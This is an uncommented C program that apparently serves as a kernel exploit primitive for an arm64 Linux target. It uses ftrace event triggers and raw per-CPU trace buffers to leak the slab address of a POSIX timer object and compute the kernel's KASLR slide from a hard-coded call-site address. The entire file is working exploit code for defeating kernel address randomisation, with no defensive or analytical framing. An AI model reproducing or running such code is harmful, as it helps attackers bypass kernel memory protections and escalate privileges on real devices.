#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>
#define TRACE "/sys/kernel/tracing"
#define SITE 0xffffffc0803718f4ULL
static int wf(const char *p, const char *v)
{
    int f = open(p, O_WRONLY | O_CLOEXEC);
    if (f < 0)
        return -1;
    int r = write(f, v, strlen(v));
    close(f);
    return r < 0 ? -1 : 0;
}
static void pin(int c)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(c, &s);
    sched_setaffinity(0, sizeof s, &s);
}
static void touch(void)
{
    volatile unsigned char *m = mmap(0, 1 << 20, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
        return;
    for (int i = 0; i < (1 << 20); i += 4096)
        m[i] = 1;
    munmap((void *)m, 1 << 20);
}
static int arm(void)
{
    if (wf(TRACE "/tracing_on", "0\n"))
        return -1;
    wf(TRACE "/events/kmem/rss_stat/trigger", "!enable_event:kmem:kmem_cache_alloc\n");
    if (wf(TRACE "/events/kmem/rss_stat/trigger", "enable_event:kmem:kmem_cache_alloc\n"))
        return -1;
    if (wf(TRACE "/events/kmem/rss_stat/enable", "1\n"))
        return -1;
    if (wf(TRACE "/tracing_on", "1\n"))
        return -1;
    touch();
    wf(TRACE "/events/kmem/rss_stat/enable", "0\n");
    return 0;
}
static size_t rd(int cpu, uint8_t *b, size_t cap)
{
    char p[128];
    snprintf(p, sizeof p, TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(p, O_RDONLY | O_CLOEXEC | O_NONBLOCK);
    if (fd < 0)
        return 0;
    size_t u = 0;
    struct timespec st, now, ts = {.tv_nsec = 1000000};
    clock_gettime(CLOCK_MONOTONIC, &st);
    for (;;)
    {
        ssize_t n = read(fd, b + u, cap - u);
        if (n > 0)
        {
            u += n;
            if (u + 4096 >= cap)
                break;
            continue;
        }
        if (n < 0 && errno == EAGAIN)
        {
            clock_gettime(CLOCK_MONOTONIC, &now);
            if ((now.tv_sec - st.tv_sec) * 1000000000LL + (now.tv_nsec - st.tv_nsec) > 100000000LL)
                break;
            nanosleep(&ts, 0);
            continue;
        }
        break;
    }
    close(fd);
    return u;
}
static int find(uint8_t *b, size_t u, int pid, uint64_t *out)
{
    for (size_t i = 8; i + 40 <= u; i++)
    {
        uint64_t s, p, r, a, sl;
        uint32_t rp;
        memcpy(&s, b + i, 8);
        if ((s & 0x1fffff) != (SITE & 0x1fffff))
            continue;
        sl = s - SITE;
        if (sl > 0x40000000 || (sl & 0x1fffff))
            continue;
        memcpy(&rp, b + i - 4, 4);
        if (pid && (int)rp != pid)
            continue;
        memcpy(&p, b + i + 8, 8);
        memcpy(&r, b + i + 16, 8);
        memcpy(&a, b + i + 24, 8);
        if ((p >> 48) != 0xffff || (p & 7))
            continue;
        if (r != 0x100 && a != 0x100)
            continue;
        *out = p;
        printf("HIT site=%llx pid=%u ptr=%llx slide=%llx\n", (unsigned long long)s, rp, (unsigned long long)p, (unsigned long long)sl);
        return 0;
    }
    return -1;
}
static int go_r, go_w, ready_r, ready_w;
static void *worker(void *a)
{
    (void)a;
    pin(1);
    char c;
    read(go_r, &c, 1);
    struct sigevent ev;
    memset(&ev, 0, sizeof ev);
    ev.sigev_notify = SIGEV_SIGNAL;
    ev.sigev_signo = SIGRTMIN;
    timer_t id;
    int r = timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &id);
    int info[2] = {(int)syscall(SYS_gettid), sched_getcpu()};
    printf("child timer_create=%d tid=%d cpu=%d\n", r, info[0], info[1]);
    write(ready_w, info, sizeof info);
    for (;;)
        pause();
}
int main(void)
{
    uint8_t *b = malloc(4 << 20);
    int go[2], ready[2];
    pipe(go);
    pipe(ready);
    go_r = go[0];
    go_w = go[1];
    ready_r = ready[0];
    ready_w = ready[1];
    pin(1);
    printf("arm=%d\n", arm());
    pid_t p = fork();
    if (!p)
    {
        pin(1);
        size_t page = 4096, len = (size_t)50000 * page;
        void *base = mmap(0, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        for (size_t i = 0; i < 50000; i++)
            mmap((char *)base + i * page, page, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
        pthread_t t;
        pthread_create(&t, 0, worker, 0);
        write(go_w, "x", 1);
        for (;;)
            pause();
    }
    write(go_w, "x", 1);
    int info[2];
    ssize_t n = read(ready_r, info, sizeof info);
    printf("ready n=%zd tid=%d cpu=%d\n", n, info[0], info[1]);
    {
        char tp[128], line[512];
        FILE *f;
        int shown = 0;
        snprintf(tp, sizeof tp, TRACE "/per_cpu/cpu%d/trace", info[1]);
        f = fopen(tp, "r");
        if (f)
        {
            while (fgets(line, sizeof line, f) && shown < 5)
            {
                if (strstr(line, "do_timer_create"))
                {
                    printf("TEXT %s", line);
                    shown++;
                }
            }
            fclose(f);
        }
        if (!shown)
            printf("TEXT none\n");
    }
    usleep(200000);
    for (int k = 0; k < 5; k++)
    {
        size_t u = rd(info[1], b, 4 << 20);
        uint64_t out = 0;
        printf("read %zu\n", u);
        {
            int cnt = 0, shown = 0;
            for (size_t i = 8; i + 40 <= u; i++)
            {
                uint32_t v;
                memcpy(&v, b + i - 4, 4);
                if (v != (uint32_t)info[0])
                    continue;
                cnt++;
                uint64_t st, pt, rq, al;
                memcpy(&st, b + i, 8);
                memcpy(&pt, b + i + 8, 8);
                memcpy(&rq, b + i + 16, 8);
                memcpy(&al, b + i + 24, 8);
                if ((st >> 48) != 0xffff)
                    continue;
                if (shown < 12)
                {
                    printf("tidrec site=%llx low=%llx ptr=%llx req=%llx alloc=%llx\n", (unsigned long long)st, (unsigned long long)(st & 0x1fffff), (unsigned long long)pt, (unsigned long long)rq, (unsigned long long)al);
                    shown++;
                }
            }
            printf("tid %d header_hits=%d\n", info[0], cnt);
        }
        {
            int shown = 0;
            for (size_t i = 8; i + 40 <= u && shown < 8; i++)
            {
                uint64_t st, pt, rq, al;
                uint32_t rp;
                memcpy(&st, b + i, 8);
                memcpy(&pt, b + i + 8, 8);
                memcpy(&rq, b + i + 16, 8);
                memcpy(&al, b + i + 24, 8);
                memcpy(&rp, b + i - 4, 4);
                if (rq != 0x100 || al != 0x100)
                    continue;
                if ((pt >> 48) != 0xffff)
                    continue;
                printf("rec site=%llx low=%llx pid=%u ptr=%llx\n", (unsigned long long)st, (unsigned long long)(st & 0x1fffff), rp, (unsigned long long)pt);
                shown++;
            }
        }
        if (!find(b, u, info[0], &out))
            break;
        usleep(20000);
    }
    return 0;
}
